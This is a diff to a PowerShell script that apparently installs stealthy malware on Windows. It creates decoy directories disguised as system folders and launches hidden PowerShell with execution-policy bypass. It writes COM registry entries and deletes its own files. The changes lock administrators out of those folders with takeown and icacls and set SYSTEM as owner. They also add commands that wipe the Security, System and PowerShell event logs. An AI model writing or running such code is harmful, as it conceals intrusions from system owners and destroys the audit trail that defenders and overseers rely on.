@@ -14,7 +14,7 @@ $paths =  @(
     "$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta",
     "$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp",
     "$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy",
-    "$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload",
+    "$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload", # check later
     "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore",
     "$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived",
     "$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",
@@ -27,12 +27,12 @@ $paths =  @(
     "$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump",
     "$env:windir\system32\spool\drivers\x64\3\en-US",
     "$env:windir\WinSxS\Temp\PendingRenames\Pending\ManifestCache",
-    ($env:windir + '\WinSxS\FileMaps\$$$\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces'),
+    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
     "$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug",
     "$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache",
     "$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump",
     "$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs",
-    "$env:windir\WinSxS\Manifests\wow64_microsoft_windows_ability_assistant_db_31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles"
+    "$env:windir\WinSxS\Manifests\wow64_microsoft-windows-ability-assistant-db-31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles",
     "$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports",
     "$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache",
     "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates",
@@ -111,6 +111,7 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidde
     New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
 }
 
+$loggedInUser = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
 
 
 foreach ($path in $ownership) {
@@ -119,8 +120,12 @@ foreach ($path in $ownership) {
             New-Item -Path "$path" -ItemType Directory -Force
         }
     }
-    takeown /f "$path"
-    icacls "$path" /grant:r "$($user):(OI)(CI)F" "SYSTEM:(OI)(CI)F" /inheritance:r /q
+    takeown /F "$path"
+    icacls "$path" /inheritance:r /Q
+    icacls "$path" /grant:r "$($user):(OI)(CI)F" "NT AUTHORITY\SYSTEM:(OI)(CI)F" /Q
+    icacls "$path" /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q
+    icacls "$path" /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q
+    icacls "$path" /setowner "NT AUTHORITY\SYSTEM" /Q
 }
 
 foreach($path in $paths){
@@ -174,4 +179,8 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidde
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\$main'"
 
 Remove-Item -Path $initFindePath -Force -ErrorAction SilentlyContinue
+wevtutil cl Security
+wevtutil cl System 
+wevtutil cl "Windows Powershell"
+Clear-EventLog -LogName "Windows PowerShell"
 Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
